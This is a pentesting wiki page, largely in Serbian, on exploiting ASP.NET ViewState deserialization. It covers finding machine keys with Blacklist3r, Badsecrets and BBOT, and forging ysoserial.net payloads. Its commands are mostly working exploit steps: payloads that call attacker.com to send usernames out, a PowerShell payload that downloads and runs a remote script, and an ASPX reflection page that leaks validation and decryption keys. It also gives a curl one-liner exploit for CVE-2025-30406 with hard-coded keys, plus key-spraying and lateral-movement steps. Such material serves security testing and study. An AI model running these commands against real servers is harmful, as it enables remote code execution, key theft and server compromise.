# Exploiting __VIEWSTATE without knowing the secrets

{{#include ../../banners/hacktricks-training.md}}



## Šta je ViewState

**ViewState** služi kao podrazumevani mehanizam u ASP.NET-u za održavanje podataka o stranici i kontrolama između web stranica. Tokom renderovanja HTML-a stranice, trenutni stanje stranice i vrednosti koje treba sačuvati pri postback-u se serijalizuju u base64-encoded stringove. Ti stringovi se zatim smeštaju u skrivena ViewState polja.

Informacije u ViewState-u se mogu karakterisati sledećim svojstvima ili njihovim kombinacijama:

- **Base64**:
- Ovaj format se koristi kada su oba atributa `EnableViewStateMac` i `ViewStateEncryptionMode` postavljena na false.
- **Base64 + MAC (Message Authentication Code) Enabled**:
- Aktivacija MAC-a se postiže postavljanjem atributa `EnableViewStateMac` na true. Ovo obezbeđuje verifikaciju integriteta podataka u ViewState-u.
- **Base64 + Encrypted**:
- Enkripcija se primenjuje kada je atribut `ViewStateEncryptionMode` postavljen na true, čime se obezbeđuje poverljivost podataka u ViewState-u.

## Test slučajevi

Slika prikazuje tabelu koja detaljno opisuje različite konfiguracije ViewState-a u ASP.NET-u na osnovu verzije .NET framework-a. Evo sažetka sadržaja:

1. Za **bilo koju verziju .NET-a**, kada su i MAC i Enkripcija onemogućeni, MachineKey nije potreban, te ne postoji primenljiva metoda za njegovo identifikovanje.
2. Za **verzije ispod 4.5**, ako je MAC omogućen ali Enkripcija nije, potreban je MachineKey. Metoda za identifikovanje MachineKey-a se naziva "Blacklist3r."
3. Za **verzije ispod 4.5**, bez obzira da li je MAC omogućen ili onemogućen, ako je Enkripcija omogućena, potreban je MachineKey. Identifikacija MachineKey-a je zadatak za "Blacklist3r - Future Development."
4. Za **verzije 4.5 i novije**, sve kombinacije MAC-a i Enkripcije (bilo da su oba true, ili je jedan true a drugi false) zahtevaju MachineKey. MachineKey se može identifikovati pomoću "Blacklist3r."

### Test slučaj: 1 – EnableViewStateMac=false and viewStateEncryptionMode=false

Takođe je moguće potpuno onemogućiti ViewStateMAC postavljanjem registry ključa `AspNetEnforceViewStateMac` na nulu u:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**Identifikovanje ViewState atributa**

Možete pokušati da utvrdite da li je ViewState zaštićen MAC-om tako što ćete presresti request koji sadrži ovaj parametar pomoću BurpSuite. Ako MAC nije korišćen za zaštitu parametra, možete ga iskoristiti koristeći [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Test case 1.5 – Like Test case 1 but the ViewState cookie isn't sent by the server

Developeri mogu **ukloniti ViewState** da ne postane deo HTTP zahteva (korisnik neće primiti ovaj cookie).\
Možda bi se pretpostavilo da ako **ViewState** **nije prisutan**, njihova implementacija je **sigurna** od bilo kakvih potencijalnih ranjivosti koje proizlaze iz ViewState deserialization.\
Međutim, to nije slučaj. Ako **dodamo ViewState parameter** u telo zahteva i pošaljemo naš serialized payload kreiran pomoću ysoserial, i dalje ćemo moći postići **code execution** kao što je prikazano u **Case 1**.

### Test Case: 2 – .Net < 4.5 and EnableViewStateMac=true & ViewStateEncryptionMode=false

Da bismo **omogućili ViewState MAC** za **konkretnu stranicu**, potrebno je napraviti sledeće izmene u određenom aspx fajlu:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
Možemo to uraditi i za **celu** aplikaciju podešavanjem u fajlu **web.config** kao što je prikazano ispod:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
Budući da je parametar ovaj put MAC protected, da bismo uspešno izvršili napad prvo moramo dobiti ključ koji se koristi.

Možete pokušati da koristite [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) da pronađete korišćeni ključ.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) je još jedan alat koji može identifikovati poznate machineKeys. Napisan je u Pythonu, tako da, za razliku od Blacklist3r, ne zahteva Windows. Za .NET viewstates postoji alat "python blacklist3r", koji je najbrži način da ga koristite.

Može se direktno proslediti viewstate i generator:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

Ili se može povezati direktno na ciljni URL i pokušati da izdvoji viewstate iz HTML-a:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

Da biste pretraživali ranjive viewstates na velikoj skali, u kombinaciji sa subdomain enumeration, može se koristiti modul `badsecrets` [**BBOT**](exploiting-__viewstate-parameter.md):
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

Ako imate sreće i ključ je pronađen, možete nastaviti napad koristeći [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
U slučajevima kada server parametar `_VIEWSTATEGENERATOR` **ne šalje** **ne morate** da **navedete** parametar `--generator`, **već ove:**
```bash
--apppath="/" --path="/hello.aspx"
```
### Exploiting recycled `<machineKey>` values at scale

Ink Dragon (2025) je pokazao koliko je opasno kada administratori **kopiraju primer `<machineKey>` blokova objavljenih u Microsoft dokumentaciji, StackOverflow odgovorima ili vendor blogovima**. Kada jedan cilj procure ili ponovo koristi te ključeve kroz farmu, svaka druga ASP.NET stranica koja veruje ViewState može biti oteta na daljinu bez dodatne ranjivosti.

1. **Sastavite kandidatski wordlist** sa procurenim `validationKey`/`decryptionKey` parovima (npr. scrape javnih repozitorijuma, Microsoft blog postova, ili ključeva oporavljenih sa jednog hosta u farmi) i ubacite ga u Blacklist3r/Badsecrets:

```bash
AspDotNetWrapper.exe --keypath reused_machinekeys.txt --url https://target/_layouts/15/ToolPane.aspx --decrypt --purpose=viewstate --modifier=<VIEWSTATEGENERATOR>
# or let Badsecrets spray the list
bbot -f subdomain-enum -m badsecrets --badsecrets-keylist reused_machinekeys.txt -t sharepoint.customer.tld
```

Alati ponavljano potpisuju benigni `__VIEWSTATE` blob sa svakim kandidatskim ključem dok server ne prihvati MAC, što dokazuje da je ključ validan.
2. **Falsifikujte maliciozni ViewState** kada je par ključeva poznat. Ako je enkripcija isključena, potreban vam je samo `validationKey`. Ako je enkripcija omogućena, uključite odgovarajući `decryptionKey` da bi payload preživeo decrypt → deserialize put:

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -c iwr http://x.x.x.x/a.ps1|iex" \
--validationkey "$VALIDATION" --decryptionkey "$DECRYPTION" --validationalg="SHA1" --generator=<VIEWSTATEGENERATOR>
```

Operateri često ugrađuju disk-resident launchere (npr. PrintNotifyPotato, ShadowPad loaders, itd.) direktno u payload jer se izvršava kao IIS worker (`w3wp.exe`).
3. **Izvršite lateralno pomeranje** recikliranjem istog `<machineKey>` na srodnim SharePoint/IIS čvorovima. Kada je jedan server kompromitovan, možete ponovo upotrebiti ključ da udarite svaki drugi server koji nije rotirao konfiguraciju.

### Test Case: 3 – .Net < 4.5 and EnableViewStateMac=true/false and ViewStateEncryptionMode=true

U ovom slučaju nije poznato da li je parameter zaštićen MAC-om. Tada je vrednost verovatno enkriptovana i biće vam **potreban Machine Key da enkriptujete svoj payload** kako biste iskoristili ranjivost.

**U ovom slučaju** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **modul je u razvoju...**

**Pre .NET 4.5**, ASP.NET može **prihvatiti** neenkryptovani \_`__VIEWSTATE`\_ parameter od korisnika **čak i ako je** **`ViewStateEncryptionMode`** podešeno na _**Always**_. ASP.NET **samo proverava** prisustvo parametra **`__VIEWSTATEENCRYPTED`** u zahtevu. **Ako se taj parameter ukloni i pošalje neenkryptovan payload, on će i dalje biti obrađen.**

Dakle, ako napadači nađu način da dobiju Machinekey preko neke druge ranjivosti kao što je file traversal, [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) komandni alat korišćen u **Case 2** može se koristiti za izvođenje RCE koristeći ViewState deserialization ranjivost.

- Uklonite `__VIEWSTATEENCRYPTED` parameter iz zahteva da biste iskoristili ViewState deserialization ranjivost, u suprotnom će vratiti grešku validacije ViewState MAC-a i exploit će propasti.

### Test Case: 4 – .Net >= 4.5 and EnableViewStateMac=true/false and ViewStateEncryptionMode=true/false except both attribute to false

Možemo primorati korišćenje ASP.NET frameworka tako što ćemo navesti sledeći parametar u web.config fajlu kao što je prikazano ispod.
```xml
<httpRuntime targetFramework="4.5" />
```
Alternativno, ovo se može učiniti navođenjem sledeće opcije unutar `machineKey` parametra u web.config fajlu.
```bash
compatibilityMode="Framework45"
```
Kao i u prethodnom primeru, vrednost je šifrovana. Dakle, da bi poslao validan payload, napadač mora imati ključ.

Možete pokušati da koristite [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) da pronađete ključ koji se koristi:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
Za detaljniji opis IISDirPath i TargetPagePath pogledajte [ovde](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

Ili, sa [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (sa vrednošću generatora):
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

Kada se identifikuje važeći Machine key, **sledeći korak je generisanje serialized payload-a koristeći** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
Ako imate vrednost `__VIEWSTATEGENERATOR`, možete pokušati da **koristite** parametar `--generator` sa tom vrednošću i **izostavite** parametre `--path` i `--apppath`

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/4.2.png)

Uspešna eksploatacija ViewState deserialization ranjivosti dovodi do out-of-band zahteva ka serveru pod kontrolom napadača, koji uključuje korisničko ime. Ovakav exploit je demonstriran u proof of concept (PoC) resursu pod naslovom "Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET". Za dodatne detalje o tome kako proces eksploatacije funkcioniše i kako koristiti alate kao što je Blacklist3r za identifikaciju MachineKey, pogledajte priloženi [PoC of Successful Exploitation](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC).

### Test Case 6 – ViewStateUserKeys is being used

Svojstvo **ViewStateUserKey** može se koristiti za **zaštitu** protiv **CSRF attack**. Ako je takav ključ definisan u aplikaciji i pokušamo da generišemo **ViewState** payload koristeći metode do sada opisane, **payload se neće obraditi od strane aplikacije**.\
Potrebno je koristiti još jedan parametar kako bi se ispravno kreirao payload:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### Rezultat uspešne eksploatacije <a href="#poc" id="poc"></a>

Za sve test slučajeve, ako ViewState YSoSerial.Net payload radi **successfully** onda server odgovori sa “**500 Internal server error**” sa sadržajem odgovora “**The state information is invalid for this page and might be corrupted**” i dobijemo OOB request.

Pogledajte [dodatne informacije ovde](<https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/[**https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)/README.md>)

### Izdvajanje ASP.NET Machine Keys putem Reflection (SharPyShell/SharePoint ToolShell)

Napadači koji su u mogućnosti da **upload or execute arbitrary ASPX code** unutar ciljnog web root mogu direktno da preuzmu tajne ključeve koji štite `__VIEWSTATE` umesto da ih bruteforcinguju.
Minimalni payload koji leaks ključeve koristi interne .NET klase kroz reflection:
```csharp
<%@ Import Namespace="System.Web.Configuration" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
public void Page_Load(object sender, EventArgs e)
{
var asm = Assembly.Load("System.Web");
var sect = asm.GetType("System.Web.Configuration.MachineKeySection");
var m = sect.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
var cfg = (MachineKeySection)m.Invoke(null, null);
// Output: ValidationKey|DecryptionKey|Algorithm|CompatibilityMode
Response.Write($"{cfg.ValidationKey}|{cfg.DecryptionKey}|{cfg.Decryption}|{cfg.CompatibilityMode}");
}
</script>
```
Zahtevanjem stranice ispisuju se **ValidationKey**, **DecryptionKey**, algoritam enkripcije i ASP.NET režim kompatibilnosti. Ove vrednosti se mogu direktno ubaciti u **ysoserial.net** da bi se kreirao važeći, potpisani `__VIEWSTATE` gadget:
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
-c "powershell -nop -c \"whoami\"" \
--generator=<VIEWSTATE_GENERATOR> \
--validationkey=<VALIDATION_KEY> --validationalg=<VALIDATION_ALG> \
--decryptionkey=<DECRYPTION_KEY> --decryptionalg=<DECRYPTION_ALG> \
--islegacy --minify
curl "http://victim/page.aspx?__VIEWSTATE=<PAYLOAD>"
```
This **key-exfiltration primitive** was mass-exploited against on-prem SharePoint servers in 2025 ("ToolShell" – CVE-2025-53770/53771), but it is applicable to any ASP.NET application where an attacker can run server-side code.

## 2024-2025 Real-world Exploitation Scenarios and Hard-coded Machine Keys

### Microsoft “publicly disclosed machine keys” wave (Dec 2024 – Feb 2025)
Microsoft Threat Intelligence reported mass exploitation of ASP.NET sites where the *machineKey* had previously been leaked on public sources (GitHub gists, blog posts, paste sites). Adversaries enumerated these keys and generated valid `__VIEWSTATE` gadgets with the newer `ysoserial.net` 1.41 `--minify` and `--islegacy` flags to evade WAF length limits:
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" \
--validationkey=<LEAKED_VALIDATION_KEY> --validationalg=SHA1 \
--decryptionkey=<LEAKED_DECRYPTION_KEY> --decryptionalg=AES \
--generator=<VIEWSTATEGEN> --minify
```
Ciljevi koji nastavljaju da koriste iste statične ključeve preko farmi ostaju ranjivi na neodređeno vreme; kada pređu na `AutoGenerate` vrednosti, tehnika spray prestaje da radi, pa prioritizirajte legacy deployments koji i dalje izlažu hard-coded material.

### CVE-2025-30406 – Gladinet CentreStack / Triofox hard-coded keys
Kudelski Security je otkrio da su više izdanja CentreStack / Triofox isporučena sa identičnim `machineKey` vrednostima, što omogućava neautentifikovano izvršavanje koda na daljinu putem falsifikovanja ViewState-a (CVE-2025-30406).

One-liner exploit:
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc.exe" \
--validationkey=ACC97055B2A494507D7D7C92DC1C854E8EA7BF4C \
--validationalg=SHA1 \
--decryptionkey=1FB1DEBB8B3B492390B2ABC63E6D1B53DC9CA2D7 \
--decryptionalg=AES --generator=24D41AAB --minify \
| curl -d "__VIEWSTATE=$(cat -)" http://victim/portal/loginpage.aspx
```
Ispravljeno u CentreStack 16.4.10315.56368 / Triofox 16.4.10317.56372 – odmah nadogradite ili zamenite ključeve.

## Reference

- [Exploiting ViewState deserialization using Blacklist3r and YSoSerial.NET](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
- [Deep dive into .NET ViewState deserialization and its exploitation](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
- [Exploiting deserialisation in ASP.NET via ViewState (Soroush Dalili, 2019)](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [Introducing badsecrets – fast machineKey discovery](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)
- [SharePoint “ToolShell” exploitation chain (Eye Security, 2025)](https://research.eye.security/sharepoint-under-siege/)
- [Microsoft Security – Code injection attacks abusing publicly disclosed ASP.NET machine keys (Feb 6 2025)](https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/)
- [Kudelski Security advisory – Gladinet CentreStack / Triofox RCE CVE-2025-30406 (Apr 16 2025)](https://research.kudelskisecurity.com/2025/04/16/gladinet-centrestack-and-gladinet-triofox-critical-rce-cve-2025-30406/)
- [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
- [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
- [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)
- [SharePoint “ToolShell” exploitation chain (Eye Security, 2025)](https://research.eye.security/sharepoint-under-siege/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)



{{#include ../../banners/hacktricks-training.md}}
